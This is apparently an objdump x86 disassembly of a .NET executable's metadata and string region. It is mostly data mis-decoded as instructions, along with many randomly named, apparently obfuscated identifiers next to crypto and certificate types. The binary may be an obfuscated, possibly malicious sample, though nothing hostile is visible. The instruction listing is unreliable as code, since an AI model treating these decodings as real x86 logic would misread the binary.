  407580:	e8 07 f0 07 ff       	call   0xff48658c
  407585:	07                   	pop    %es
  407586:	0c 08                	or     $0x8,%al
  407588:	11 08                	adc    %ecx,(%eax)
  40758a:	20 08                	and    %cl,(%eax)
  40758c:	2d 08 72 08 80       	sub    $0x80087208,%eax
  407591:	08 96 08 a2 08 a8    	or     %dl,-0x57f75df8(%esi)
  407597:	08 ae 08 e7 08 f1    	or     %ch,-0xef718f8(%esi)
  40759d:	08 f7                	or     %dh,%bh
  40759f:	08 fc                	or     %bh,%ah
  4075a1:	08 02                	or     %al,(%edx)
  4075a3:	09 0b                	or     %ecx,(%ebx)
  4075a5:	09 18                	or     %ebx,(%eax)
  4075a7:	09 31                	or     %esi,(%ecx)
  4075a9:	09 04 00             	or     %eax,(%eax,%eax,1)
  4075ac:	01 00                	add    %eax,(%eax)
  4075ae:	16                   	push   %ss
  4075af:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4075b2:	17                   	pop    %ss
  4075b3:	00 0d 00 18 00 0f    	add    %cl,0xf001800
  4075b9:	00 00                	add    %al,(%eax)
  4075bb:	00 25 02 9f 00 00    	add    %ah,0x9f02
  4075c1:	00 7c 25 a4          	add    %bh,-0x5c(%ebp,%eiz,1)
  4075c5:	00 00                	add    %al,(%eax)
  4075c7:	00 1d 17 a9 00 00    	add    %bl,0xa917
  4075cd:	00 f1                	add    %dh,%cl
  4075cf:	06                   	push   %es
  4075d0:	ae                   	scas   %es:(%edi),%al
  4075d1:	00 00                	add    %al,(%eax)
  4075d3:	00 e1                	add    %ah,%cl
  4075d5:	1c ae                	sbb    $0xae,%al
  4075d7:	00 00                	add    %al,(%eax)
  4075d9:	00 29                	add    %ch,(%ecx)
  4075db:	06                   	push   %es
  4075dc:	b2 00                	mov    $0x0,%dl
  4075de:	00 00                	add    %al,(%eax)
  4075e0:	93                   	xchg   %eax,%ebx
  4075e1:	0c b7                	or     $0xb7,%al
  4075e3:	00 00                	add    %al,(%eax)
  4075e5:	00 91 09 bb 00 00    	add    %dl,0xbb09(%ecx)
  4075eb:	00 90 1c b2 00 00    	add    %dl,0xb21c(%eax)
  4075f1:	00 08                	add    %cl,(%eax)
  4075f3:	1c bf                	sbb    $0xbf,%al
  4075f5:	00 00                	add    %al,(%eax)
  4075f7:	00 60 07             	add    %ah,0x7(%eax)
  4075fa:	b7 00                	mov    $0x0,%bh
  4075fc:	00 00                	add    %al,(%eax)
  4075fe:	c7                   	(bad)
  4075ff:	08 c3                	or     %al,%bl
  407601:	01 00                	add    %eax,(%eax)
  407603:	00 37                	add    %dh,(%edi)
  407605:	1c f8                	sbb    $0xf8,%al
  407607:	01 00                	add    %eax,(%eax)
  407609:	00 f5                	add    %dh,%ch
  40760b:	09 fe                	or     %edi,%esi
  40760d:	01 00                	add    %eax,(%eax)
  40760f:	00 2f                	add    %ch,(%edi)
  407611:	0a 69 02             	or     0x2(%ecx),%ch
  407614:	00 00                	add    %al,(%eax)
  407616:	a0 0a 6d 02 00       	mov    0x26d0a,%al
  40761b:	00 7b 02             	add    %bh,0x2(%ebx)
  40761e:	71 02                	jno    0x407622
  407620:	00 00                	add    %al,(%eax)
  407622:	a1 18 75 02 00       	mov    0x27518,%eax
  407627:	00 89 02 7a 02 02    	add    %cl,0x2027a02(%ecx)
  40762d:	00 06                	add    %al,(%esi)
  40762f:	00 03                	add    %al,(%ebx)
  407631:	00 01                	add    %al,(%ecx)
  407633:	00 07                	add    %al,(%edi)
  407635:	00 03                	add    %al,(%ebx)
  407637:	00 02                	add    %al,(%edx)
  407639:	00 08                	add    %cl,(%eax)
  40763b:	00 05 00 01 00 09    	add    %al,0x9000100
  407641:	00 05 00 02 00 0a    	add    %al,0xa000200
  407647:	00 07                	add    %al,(%edi)
  407649:	00 01                	add    %al,(%ecx)
  40764b:	00 0b                	add    %cl,(%ebx)
  40764d:	00 07                	add    %al,(%edi)
  40764f:	00 02                	add    %al,(%edx)
  407651:	00 0c 00             	add    %cl,(%eax,%eax,1)
  407654:	09 00                	or     %eax,(%eax)
  407656:	01 00                	add    %eax,(%eax)
  407658:	0d 00 09 00 02       	or     $0x2000900,%eax
  40765d:	00 0e                	add    %cl,(%esi)
  40765f:	00 0b                	add    %cl,(%ebx)
  407661:	00 01                	add    %al,(%ecx)
  407663:	00 0f                	add    %cl,(%edi)
  407665:	00 0b                	add    %cl,(%ebx)
  407667:	00 02                	add    %al,(%edx)
  407669:	00 10                	add    %dl,(%eax)
  40766b:	00 0d 00 01 00 11    	add    %cl,0x11000100
  407671:	00 0d 00 02 00 12    	add    %cl,0x12000200
  407677:	00 0f                	add    %cl,(%edi)
  407679:	00 01                	add    %al,(%ecx)
  40767b:	00 13                	add    %dl,(%ebx)
  40767d:	00 0f                	add    %cl,(%edi)
  40767f:	00 02                	add    %al,(%edx)
  407681:	00 14 00             	add    %dl,(%eax,%eax,1)
  407684:	11 00                	adc    %eax,(%eax)
  407686:	02 00                	add    (%eax),%al
  407688:	15 00 13 00 01       	adc    $0x1001300,%eax
  40768d:	00 16                	add    %dl,(%esi)
  40768f:	00 13                	add    %dl,(%ebx)
  407691:	00 02                	add    %al,(%edx)
  407693:	00 17                	add    %dl,(%edi)
  407695:	00 15 00 01 00 18    	add    %dl,0x18000100
  40769b:	00 15 00 02 00 19    	add    %dl,0x19000200
  4076a1:	00 17                	add    %dl,(%edi)
  4076a3:	00 01                	add    %al,(%ecx)
  4076a5:	00 1a                	add    %bl,(%edx)
  4076a7:	00 17                	add    %dl,(%edi)
  4076a9:	00 02                	add    %al,(%edx)
  4076ab:	00 60 00             	add    %ah,0x0(%eax)
  4076ae:	19 00                	sbb    %eax,(%eax)
  4076b0:	02 00                	add    (%eax),%al
  4076b2:	68 00 1b 00 02       	push   $0x2001b00
  4076b7:	00 69 00             	add    %ch,0x0(%ecx)
  4076ba:	1d 00 02 00 8b       	sbb    $0x8b000200,%eax
  4076bf:	00 1f                	add    %bl,(%edi)
  4076c1:	00 01                	add    %al,(%ecx)
  4076c3:	00 8c 00 1f 00 02 00 	add    %cl,0x2001f(%eax,%eax,1)
  4076ca:	8d 00                	lea    (%eax),%eax
  4076cc:	21 00                	and    %eax,(%eax)
  4076ce:	01 00                	add    %eax,(%eax)
  4076d0:	8e 00                	mov    (%eax),%es
  4076d2:	21 00                	and    %eax,(%eax)
  4076d4:	02 00                	add    (%eax),%al
  4076d6:	8f 00                	pop    (%eax)
  4076d8:	23 00                	and    (%eax),%eax
  4076da:	01 00                	add    %eax,(%eax)
  4076dc:	90                   	nop
  4076dd:	00 23                	add    %ah,(%ebx)
  4076df:	00 02                	add    %al,(%edx)
  4076e1:	00 91 00 25 00 02    	add    %dl,0x2002500(%ecx)
  4076e7:	00 92 00 27 00 16    	add    %dl,0x16002700(%edx)
  4076ed:	00 c0                	add    %al,%al
  4076ef:	00 03                	add    %al,(%ebx)
  4076f1:	00 16                	add    %dl,(%esi)
  4076f3:	00 c2                	add    %al,%dl
  4076f5:	00 05 00 16 00 c4    	add    %al,0xc4001600
  4076fb:	00 07                	add    %al,(%edi)
  4076fd:	00 18                	add    %bl,(%eax)
  4076ff:	00 26                	add    %ah,(%esi)
  407701:	01 09                	add    %ecx,(%ecx)
  407703:	00 6a 18             	add    %ch,0x18(%edx)
  407706:	5d                   	pop    %ebp
  407707:	18 75 18             	sbb    %dh,0x18(%ebp)
  40770a:	ef                   	out    %eax,(%dx)
  40770b:	05 5b 06 75 06       	add    $0x675065b,%eax
  407710:	9c                   	pushf
  407711:	06                   	push   %es
  407712:	ff 06                	incl   (%esi)
  407714:	27                   	daa
  407715:	07                   	pop    %es
  407716:	00 01                	add    %al,(%ecx)
  407718:	71 00                	jno    0x40771a
  40771a:	14 25                	adc    $0x25,%al
  40771c:	01 00                	add    %eax,(%eax)
  40771e:	00 01                	add    %al,(%ecx)
  407720:	73 00                	jae    0x407722
  407722:	71 24                	jno    0x407748
  407724:	01 00                	add    %eax,(%eax)
  407726:	00 01                	add    %al,(%ecx)
  407728:	75 00                	jne    0x40772a
  40772a:	52                   	push   %edx
  40772b:	0f 02 00             	lar    (%eax),%eax
  40772e:	41                   	inc    %ecx
  40772f:	01 77 00             	add    %esi,0x0(%edi)
  407732:	90                   	nop
  407733:	23 02                	and    (%edx),%eax
  407735:	00 40 01             	add    %al,0x1(%eax)
  407738:	79 00                	jns    0x40773a
  40773a:	48                   	dec    %eax
  40773b:	11 02                	adc    %eax,(%edx)
  40773d:	00 40 01             	add    %al,0x1(%eax)
  407740:	7b 00                	jnp    0x407742
  407742:	d5 17                	aad    $0x17
  407744:	03 00                	add    (%eax),%eax
  407746:	50                   	push   %eax
  407747:	20 00                	and    %al,(%eax)
  407749:	00 2d 00 70 20 00    	add    %ch,0x207000
  40774f:	00 47 00             	add    %al,0x0(%edi)
  407752:	04 80                	add    $0x80,%al
  407754:	00 00                	add    %al,(%eax)
  407756:	01 00                	add    %eax,(%eax)
	...
  407764:	2b 00                	sub    (%eax),%eax
  407766:	00 00                	add    %al,(%eax)
  407768:	04 00                	add    $0x0,%al
	...
  407772:	00 00                	add    %al,(%eax)
  407774:	01 00                	add    %eax,(%eax)
  407776:	28 0b                	sub    %cl,(%ebx)
  407778:	00 00                	add    %al,(%eax)
  40777a:	00 00                	add    %al,(%eax)
  40777c:	04 00                	add    $0x0,%al
	...
  407786:	00 00                	add    %al,(%eax)
  407788:	01 00                	add    %eax,(%eax)
  40778a:	40                   	inc    %eax
  40778b:	19 00                	sbb    %eax,(%eax)
  40778d:	00 00                	add    %al,(%eax)
  40778f:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  40779a:	00 00                	add    %al,(%eax)
  40779c:	cc                   	int3
  40779d:	00 30                	add    %dh,(%eax)
  40779f:	15 00 00 00 00       	adc    $0x0,%eax
  4077a4:	04 00                	add    $0x0,%al
  4077a6:	00 00                	add    %al,(%eax)
  4077a8:	00 00                	add    %al,(%eax)
  4077aa:	00 00                	add    %al,(%eax)
  4077ac:	70 00                	jo     0x4077ae
  4077ae:	00 00                	add    %al,(%eax)
  4077b0:	01 00                	add    %eax,(%eax)
  4077b2:	06                   	push   %es
  4077b3:	11 00                	adc    %eax,(%eax)
  4077b5:	00 00                	add    %al,(%eax)
  4077b7:	00 0a                	add    %cl,(%edx)
	...
  4077c1:	00 00                	add    %al,(%eax)
  4077c3:	00 cc                	add    %cl,%ah
  4077c5:	00 a5 0b 00 00 00    	add    %ah,0xb(%ebp)
  4077cb:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  4077d6:	00 00                	add    %al,(%eax)
  4077d8:	cc                   	int3
  4077d9:	00 3c 23             	add    %bh,(%ebx,%eiz,1)
  4077dc:	00 00                	add    %al,(%eax)
  4077de:	00 00                	add    %al,(%eax)
  4077e0:	04 00                	add    $0x0,%al
	...
  4077ea:	00 00                	add    %al,(%eax)
  4077ec:	01 00                	add    %eax,(%eax)
  4077ee:	e1 20                	loope  0x407810
  4077f0:	00 00                	add    %al,(%eax)
  4077f2:	00 00                	add    %al,(%eax)
  4077f4:	04 00                	add    $0x0,%al
  4077f6:	00 00                	add    %al,(%eax)
  4077f8:	00 00                	add    %al,(%eax)
  4077fa:	00 00                	add    %al,(%eax)
  4077fc:	70 00                	jo     0x4077fe
  4077fe:	00 00                	add    %al,(%eax)
  407800:	cc                   	int3
  407801:	00 54 1c 00          	add    %dl,0x0(%esp,%ebx,1)
  407805:	00 00                	add    %al,(%eax)
  407807:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40780a:	0b 00                	or     (%eax),%eax
  40780c:	10 00                	adc    %al,(%eax)
  40780e:	0f 00 14 00          	lldt   (%eax,%eax,1)
  407812:	13 00                	adc    (%eax),%eax
  407814:	1e                   	push   %ds
  407815:	00 1d 00 75 01 8d    	add    %bl,0x8d017500
  40781b:	06                   	push   %es
  40781c:	00 41 63             	add    %al,0x63(%ecx)
  40781f:	74 69                	je     0x40788a
  407821:	6f                   	outsl  %ds:(%esi),(%dx)
  407822:	6e                   	outsb  %ds:(%esi),(%dx)
  407823:	60                   	pusha
  407824:	31 30                	xor    %esi,(%eax)
  407826:	00 49 45             	add    %cl,0x45(%ecx)
  407829:	6e                   	outsb  %ds:(%esi),(%dx)
  40782a:	75 6d                	jne    0x407899
  40782c:	65 72 61             	gs jb  0x407890
  40782f:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
  407833:	31 00                	xor    %eax,(%eax)
  407835:	43                   	inc    %ebx
  407836:	61                   	popa
  407837:	6c                   	insb   (%dx),%es:(%edi)
  407838:	6c                   	insb   (%dx),%es:(%edi)
  407839:	53                   	push   %ebx
  40783a:	69 74 65 60 31 00 4c 	imul   $0x694c0031,0x60(%ebp,%eiz,2),%esi
  407841:	69 
  407842:	73 74                	jae    0x4078b8
  407844:	60                   	pusha
  407845:	31 00                	xor    %eax,(%eax)
  407847:	6d                   	insl   (%dx),%es:(%edi)
  407848:	6b 6f 31 00          	imul   $0x0,0x31(%edi),%ebp
  40784c:	4d                   	dec    %ebp
  40784d:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  407854:	74 2e                	je     0x407884
  407856:	57                   	push   %edi
  407857:	69 6e 33 32 00 54 6f 	imul   $0x6f540032,0x33(%esi),%ebp
  40785e:	55                   	push   %ebp
  40785f:	49                   	dec    %ecx
  407860:	6e                   	outsb  %ds:(%esi),(%dx)
  407861:	74 33                	je     0x407896
  407863:	32 00                	xor    (%eax),%al
  407865:	54                   	push   %esp
  407866:	6f                   	outsl  %ds:(%esi),(%dx)
  407867:	49                   	dec    %ecx
  407868:	6e                   	outsb  %ds:(%esi),(%dx)
  407869:	74 33                	je     0x40789e
  40786b:	32 00                	xor    (%eax),%al
  40786d:	58                   	pop    %eax
  40786e:	35 30 39 43 65       	xor    $0x65433930,%eax
  407873:	72 74                	jb     0x4078e9
  407875:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  40787c:	32 00                	xor    (%eax),%al
  40787e:	54                   	push   %esp
  40787f:	6f                   	outsl  %ds:(%esi),(%dx)
  407880:	55                   	push   %ebp
  407881:	49                   	dec    %ecx
  407882:	6e                   	outsb  %ds:(%esi),(%dx)
  407883:	74 36                	je     0x4078bb
  407885:	34 00                	xor    $0x0,%al
  407887:	54                   	push   %esp
  407888:	6f                   	outsl  %ds:(%esi),(%dx)
  407889:	49                   	dec    %ecx
  40788a:	6e                   	outsb  %ds:(%esi),(%dx)
  40788b:	74 36                	je     0x4078c3
  40788d:	34 00                	xor    $0x0,%al
  40788f:	54                   	push   %esp
  407890:	6f                   	outsl  %ds:(%esi),(%dx)
  407891:	55                   	push   %ebp
  407892:	49                   	dec    %ecx
  407893:	6e                   	outsb  %ds:(%esi),(%dx)
  407894:	74 31                	je     0x4078c7
  407896:	36 00 54 6f 49       	add    %dl,%ss:0x49(%edi,%ebp,2)
  40789b:	6e                   	outsb  %ds:(%esi),(%dx)
  40789c:	74 31                	je     0x4078cf
  40789e:	36 00 48 4d          	add    %cl,%ss:0x4d(%eax)
  4078a2:	41                   	inc    %ecx
  4078a3:	43                   	inc    %ebx
  4078a4:	53                   	push   %ebx
  4078a5:	48                   	dec    %eax
  4078a6:	41                   	inc    %ecx
  4078a7:	32 35 36 00 67 65    	xor    0x65670036,%dh
  4078ad:	74 5f                	je     0x40790e
  4078af:	55                   	push   %ebp
  4078b0:	54                   	push   %esp
  4078b1:	46                   	inc    %esi
  4078b2:	38 00                	cmp    %al,(%eax)
  4078b4:	3c 4d                	cmp    $0x4d,%al
  4078b6:	6f                   	outsl  %ds:(%esi),(%dx)
  4078b7:	64 75 6c             	fs jne 0x407926
  4078ba:	65 3e 00 71 61       	gs add %dh,%ds:0x61(%ecx)
  4078bf:	6c                   	insb   (%dx),%es:(%edi)
  4078c0:	55                   	push   %ebp
  4078c1:	41                   	inc    %ecx
  4078c2:	54                   	push   %esp
  4078c3:	56                   	push   %esi
  4078c4:	59                   	pop    %ecx
  4078c5:	42                   	inc    %edx
  4078c6:	4b                   	dec    %ebx
  4078c7:	41                   	inc    %ecx
  4078c8:	00 53 49             	add    %dl,0x49(%ebx)
  4078cb:	48                   	dec    %eax
  4078cc:	67 44                	addr16 inc %esp
  4078ce:	6a 63                	push   $0x63
  4078d0:	6c                   	insb   (%dx),%es:(%edi)
  4078d1:	56                   	push   %esi
  4078d2:	6c                   	insb   (%dx),%es:(%edi)
  4078d3:	52                   	push   %edx
  4078d4:	41                   	inc    %ecx
  4078d5:	00 41 76             	add    %al,0x76(%ecx)
  4078d8:	42                   	inc    %edx
  4078d9:	76 4a                	jbe    0x407925
  4078db:	4e                   	dec    %esi
  4078dc:	50                   	push   %eax
  4078dd:	6a 6c                	push   $0x6c
  4078df:	70 72                	jo     0x407953
  4078e1:	5a                   	pop    %edx
  4078e2:	41                   	inc    %ecx
  4078e3:	00 56 4c             	add    %dl,0x4c(%esi)
  4078e6:	72 4c                	jb     0x407934
  4078e8:	41                   	inc    %ecx
  4078e9:	68 42 49 6b 49       	push   $0x496b4942
  4078ee:	73 61                	jae    0x407951
  4078f0:	41                   	inc    %ecx
  4078f1:	00 67 64             	add    %ah,0x64(%edi)
  4078f4:	68 62 5a 51 57       	push   $0x57515a62
  4078f9:	7a 52                	jp     0x40794d
  4078fb:	4f                   	dec    %edi
  4078fc:	46                   	inc    %esi
  4078fd:	42                   	inc    %edx
  4078fe:	00 50 63             	add    %dl,0x63(%eax)
  407901:	65 62 57 41          	bound  %edx,%gs:0x41(%edi)
  407905:	72 4b                	jb     0x407952
  407907:	54                   	push   %esp
  407908:	64 77 63             	fs ja  0x40796e
  40790b:	4d                   	dec    %ebp
  40790c:	42                   	inc    %edx
  40790d:	00 58 65             	add    %bl,0x65(%eax)
  407910:	55                   	push   %ebp
  407911:	6e                   	outsb  %ds:(%esi),(%dx)
  407912:	6a 43                	push   $0x43
  407914:	77 50                	ja     0x407966
  407916:	50                   	push   %eax
  407917:	64 4f                	fs dec %edi
  407919:	42                   	inc    %edx
  40791a:	00 78 59             	add    %bh,0x59(%eax)
  40791d:	56                   	push   %esi
  40791e:	55                   	push   %ebp
  40791f:	6d                   	insl   (%dx),%es:(%edi)
  407920:	59                   	pop    %ecx
  407921:	45                   	inc    %ebp
  407922:	5a                   	pop    %edx
  407923:	4a                   	dec    %edx
  407924:	58                   	pop    %eax
  407925:	54                   	push   %esp
  407926:	78 54                	js     0x40797c
  407928:	42                   	inc    %edx
  407929:	00 59 63             	add    %bl,0x63(%ecx)
  40792c:	44                   	inc    %esp
  40792d:	68 58 57 79 6f       	push   $0x6f795758
  407932:	4e                   	dec    %esi
  407933:	41                   	inc    %ecx
  407934:	78 68                	js     0x40799e
  407936:	74 56                	je     0x40798e
  407938:	42                   	inc    %edx
  407939:	00 75 53             	add    %dh,0x53(%ebp)
  40793c:	69 72 44 63 46 43 62 	imul   $0x62434663,0x44(%edx),%esi
  407943:	57                   	push   %edi
  407944:	77 77                	ja     0x4079bd
  407946:	59                   	pop    %ecx
  407947:	74 65                	je     0x4079ae
  407949:	42                   	inc    %edx
  40794a:	00 56 4f             	add    %dl,0x4f(%esi)
  40794d:	7a 67                	jp     0x4079b6
  40794f:	76 6f                	jbe    0x4079c0
  407951:	58                   	pop    %eax
  407952:	57                   	push   %edi
  407953:	6e                   	outsb  %ds:(%esi),(%dx)
  407954:	59                   	pop    %ecx
  407955:	68 42 00 4d 63       	push   $0x634d0042
  40795a:	78 43                	js     0x40799f
  40795c:	6a 6f                	push   $0x6f
  40795e:	46                   	inc    %esi
  40795f:	59                   	pop    %ecx
  407960:	4c                   	dec    %esp
  407961:	4e                   	dec    %esi
  407962:	70 69                	jo     0x4079cd
  407964:	42                   	inc    %edx
  407965:	00 64 55 67          	add    %ah,0x67(%ebp,%edx,2)
  407969:	45                   	inc    %ebp
  40796a:	75 46                	jne    0x4079b2
  40796c:	45                   	inc    %ebp
  40796d:	72 51                	jb     0x4079c0
  40796f:	6d                   	insl   (%dx),%es:(%edi)
  407970:	70 42                	jo     0x4079b4
  407972:	00 54 59 4a          	add    %dl,0x4a(%ecx,%ebx,2)
  407976:	44                   	inc    %esp
  407977:	43                   	inc    %ebx
  407978:	45                   	inc    %ebp
  407979:	6b 74 47 68 6b       	imul   $0x6b,0x68(%edi,%eax,2),%esi
  40797e:	4a                   	dec    %edx
  40797f:	74 74                	je     0x4079f5
  407981:	42                   	inc    %edx
  407982:	00 4e 50             	add    %cl,0x50(%esi)
  407985:	75 73                	jne    0x4079fa
  407987:	73 4a                	jae    0x4079d3
  407989:	69 45 42 43 00 67 44 	imul   $0x44670043,0x42(%ebp),%eax
  407990:	4b                   	dec    %ebx
  407991:	79 4c                	jns    0x4079df
  407993:	6e                   	outsb  %ds:(%esi),(%dx)
  407994:	47                   	inc    %edi
  407995:	5a                   	pop    %edx
  407996:	54                   	push   %esp
  407997:	5a                   	pop    %edx
  407998:	6c                   	insb   (%dx),%es:(%edi)
  407999:	4f                   	dec    %edi
  40799a:	43                   	inc    %ebx
  40799b:	43                   	inc    %ebx
  40799c:	00 47 43             	add    %al,0x43(%edi)
  40799f:	00 42 6d             	add    %al,0x6d(%edx)
  4079a2:	52                   	push   %edx
  4079a3:	6b 45 51 43          	imul   $0x43,0x51(%ebp),%eax
  4079a7:	41                   	inc    %ecx
  4079a8:	4c                   	dec    %esp
  4079a9:	45                   	inc    %ebp
  4079aa:	74 69                	je     0x407a15
  4079ac:	43                   	inc    %ebx
  4079ad:	00 61 55             	add    %ah,0x55(%ecx)
  4079b0:	53                   	push   %ebx
  4079b1:	45                   	inc    %ebp
  4079b2:	47                   	inc    %edi
  4079b3:	55                   	push   %ebp
  4079b4:	46                   	inc    %esi
  4079b5:	43                   	inc    %ebx
  4079b6:	72 43                	jb     0x4079fb
  4079b8:	00 48 56             	add    %cl,0x56(%eax)
  4079bb:	68 6f 66 58 69       	push   $0x6958666f
  4079c0:	75 6a                	jne    0x407a2c
  4079c2:	73 78                	jae    0x407a3c
  4079c4:	43                   	inc    %ebx
  4079c5:	00 51 64             	add    %dl,0x64(%ecx)
  4079c8:	7a 47                	jp     0x407a11
  4079ca:	6d                   	insl   (%dx),%es:(%edi)
  4079cb:	74 63                	je     0x407a30
  4079cd:	7a 4c                	jp     0x407a1b
  4079cf:	4c                   	dec    %esp
  4079d0:	6d                   	insl   (%dx),%es:(%edi)
  4079d1:	70 74                	jo     0x407a47
  4079d3:	44                   	inc    %esp
  4079d4:	44                   	inc    %esp
  4079d5:	00 4d 61             	add    %cl,0x61(%ebp)
  4079d8:	70 4e                	jo     0x407a28
  4079da:	61                   	popa
  4079db:	6d                   	insl   (%dx),%es:(%edi)
  4079dc:	65 54                	gs push %esp
  4079de:	6f                   	outsl  %ds:(%esi),(%dx)
  4079df:	4f                   	dec    %edi
  4079e0:	49                   	dec    %ecx
  4079e1:	44                   	inc    %esp
  4079e2:	00 67 65             	add    %ah,0x65(%edi)
  4079e5:	74 5f                	je     0x407a46
  4079e7:	46                   	inc    %esi
  4079e8:	6f                   	outsl  %ds:(%esi),(%dx)
  4079e9:	72 6d                	jb     0x407a58
  4079eb:	61                   	popa
  4079ec:	74 49                	je     0x407a37
  4079ee:	44                   	inc    %esp
  4079ef:	00 44 44 41          	add    %al,0x41(%esp,%eax,2)
  4079f3:	45                   	inc    %ebp
  4079f4:	78 72                	js     0x407a68
  4079f6:	75 61                	jne    0x407a59
  4079f8:	41                   	inc    %ecx
  4079f9:	4a                   	dec    %edx
  4079fa:	59                   	pop    %ecx
  4079fb:	4c                   	dec    %esp
  4079fc:	44                   	inc    %esp
  4079fd:	00 71 46             	add    %dh,0x46(%ecx)
  407a00:	6b 69 67 6d          	imul   $0x6d,0x67(%ecx),%ebp
  407a04:	69 70 57 6c 7a 5a 4d 	imul   $0x4d5a7a6c,0x57(%eax),%esi
  407a0b:	44                   	inc    %esp
  407a0c:	00 64 62 4b          	add    %ah,0x4b(%edx,%eiz,2)
  407a10:	73 52                	jae    0x407a64
  407a12:	4b                   	dec    %ebx
  407a13:	6d                   	insl   (%dx),%es:(%edi)
  407a14:	54                   	push   %esp
  407a15:	6c                   	insb   (%dx),%es:(%edi)
  407a16:	6f                   	outsl  %ds:(%esi),(%dx)
  407a17:	54                   	push   %esp
  407a18:	44                   	inc    %esp
  407a19:	00 53 7a             	add    %dl,0x7a(%ebx)
  407a1c:	4e                   	dec    %esi
  407a1d:	45                   	inc    %ebp
  407a1e:	57                   	push   %edi
  407a1f:	54                   	push   %esp
  407a20:	61                   	popa
  407a21:	4c                   	dec    %esp
  407a22:	6e                   	outsb  %ds:(%esi),(%dx)
  407a23:	71 42                	jno    0x407a67
  407a25:	66 44                	inc    %sp
  407a27:	00 59 44             	add    %bl,0x44(%ecx)
  407a2a:	43                   	inc    %ebx
  407a2b:	50                   	push   %eax
  407a2c:	4f                   	dec    %edi
  407a2d:	77 4b                	ja     0x407a7a
  407a2f:	73 4b                	jae    0x407a7c
  407a31:	66 76 44             	data16 jbe 0x407a78
  407a34:	00 66 7a             	add    %ah,0x7a(%esi)
  407a37:	4e                   	dec    %esi
  407a38:	4f                   	dec    %edi
  407a39:	67 76 71             	addr16 jbe 0x407aad
  407a3c:	55                   	push   %ebp
  407a3d:	52                   	push   %edx
  407a3e:	41                   	inc    %ecx
  407a3f:	45                   	inc    %ebp
  407a40:	00 43 44             	add    %al,0x44(%ebx)
  407a43:	47                   	inc    %edi
  407a44:	64 5a                	fs pop %edx
  407a46:	41                   	inc    %ecx
  407a47:	57                   	push   %edi
  407a48:	79 6d                	jns    0x407ab7
  407a4a:	4d                   	dec    %ebp
  407a4b:	4c                   	dec    %esp
  407a4c:	45                   	inc    %ebp
  407a4d:	00 77 78             	add    %dh,0x78(%edi)
  407a50:	67 51                	addr16 push %ecx
  407a52:	73 74                	jae    0x407ac8
  407a54:	5a                   	pop    %edx
  407a55:	53                   	push   %ebx
  407a56:	55                   	push   %ebp
  407a57:	6b 69 78 4d          	imul   $0x4d,0x78(%ecx),%ebp
  407a5b:	45                   	inc    %ebp
  407a5c:	00 46 49             	add    %al,0x49(%esi)
  407a5f:	64 6b 64 54 69 46    	imul   $0x46,%fs:0x69(%esp,%edx,2),%esp
  407a65:	50                   	push   %eax
  407a66:	45                   	inc    %ebp
  407a67:	59                   	pop    %ecx
  407a68:	50                   	push   %eax
  407a69:	45                   	inc    %ebp
  407a6a:	00 4b 6e             	add    %cl,0x6e(%ebx)
  407a6d:	48                   	dec    %eax
  407a6e:	4c                   	dec    %esp
  407a6f:	6b 68 55 6f          	imul   $0x6f,0x55(%eax),%ebp
  407a73:	75 6a                	jne    0x407adf
  407a75:	56                   	push   %esi
  407a76:	55                   	push   %ebp
  407a77:	79 4c                	jns    0x407ac5
  407a79:	52                   	push   %edx
  407a7a:	45                   	inc    %ebp
  407a7b:	00 6a 78             	add    %ch,0x78(%edx)
  407a7e:	77 6b                	ja     0x407aeb
  407a80:	78 47                	js     0x407ac9
  407a82:	65 53                	gs push %ebx
  407a84:	69 56 54 45 00 52 53 	imul   $0x53520045,0x54(%esi),%edx
  407a8b:	77 7a                	ja     0x407b07
  407a8d:	52                   	push   %edx
  407a8e:	77 4d                	ja     0x407add
  407a90:	45                   	inc    %ebp
  407a91:	64 4b                	fs dec %ebx
  407a93:	61                   	popa
  407a94:	65 45                	gs inc %ebp
  407a96:	00 58 75             	add    %bl,0x75(%eax)
  407a99:	61                   	popa
  407a9a:	73 57                	jae    0x407af3
  407a9c:	6b 51 50 42          	imul   $0x42,0x50(%ecx),%edx
  407aa0:	54                   	push   %esp
  407aa1:	73 67                	jae    0x407b0a
  407aa3:	45                   	inc    %ebp
  407aa4:	00 45 54             	add    %al,0x54(%ebp)
  407aa7:	61                   	popa
  407aa8:	6b 56 79 46          	imul   $0x46,0x79(%esi),%edx
  407aac:	6c                   	insb   (%dx),%es:(%edi)
  407aad:	56                   	push   %esi
  407aae:	53                   	push   %ebx
  407aaf:	69 6c 45 00 75 4f 43 	imul   $0x48434f75,0x0(%ebp,%eax,2),%ebp
  407ab6:	48 
  407ab7:	78 73                	js     0x407b2c
  407ab9:	68 5a 6e 72 6a       	push   $0x6a726e5a
  407abe:	52                   	push   %edx
  407abf:	79 45                	jns    0x407b06
  407ac1:	00 6b 6f             	add    %ch,0x6f(%ebx)
  407ac4:	59                   	pop    %ecx
  407ac5:	6d                   	insl   (%dx),%es:(%edi)
  407ac6:	5a                   	pop    %edx
  407ac7:	43                   	inc    %ebx
  407ac8:	51                   	push   %ecx
  407ac9:	71 69                	jno    0x407b34
  407acb:	5a                   	pop    %edx
  407acc:	46                   	inc    %esi
  407acd:	00 63 55             	add    %ah,0x55(%ebx)
  407ad0:	7a 70                	jp     0x407b42
  407ad2:	67 48                	addr16 dec %eax
  407ad4:	57                   	push   %edi
  407ad5:	69 61 65 79 6c 46 00 	imul   $0x466c79,0x65(%ecx),%esp
  407adc:	56                   	push   %esi
  407add:	6a 69                	push   $0x69
  407adf:	57                   	push   %edi
  407ae0:	67 4d                	addr16 dec %ebp
  407ae2:	78 4c                	js     0x407b30
  407ae4:	48                   	dec    %eax
  407ae5:	71 46                	jno    0x407b2d
  407ae7:	00 4a 62             	add    %cl,0x62(%edx)
  407aea:	48                   	dec    %eax
  407aeb:	50                   	push   %eax
  407aec:	57                   	push   %edi
  407aed:	66 46                	inc    %si
  407aef:	4f                   	dec    %edi
  407af0:	59                   	pop    %ecx
  407af1:	71 73                	jno    0x407b66
  407af3:	48                   	dec    %eax
  407af4:	48                   	dec    %eax
  407af5:	47                   	inc    %edi
  407af6:	00 45 52             	add    %al,0x52(%ebp)
  407af9:	49                   	dec    %ecx
  407afa:	4e                   	dec    %esi
